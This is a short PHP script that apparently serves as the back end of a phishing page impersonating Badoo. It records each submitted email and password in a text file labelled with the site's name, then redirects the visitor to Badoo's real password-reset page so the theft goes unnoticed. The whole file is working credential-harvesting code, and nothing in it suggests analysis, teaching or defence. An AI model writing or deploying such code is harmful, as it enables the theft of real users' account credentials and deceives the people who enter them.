<?php

file_put_contents("../userpass/usernames.txt", "Badoo Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://badoo.com/forgot/');
exit();
?>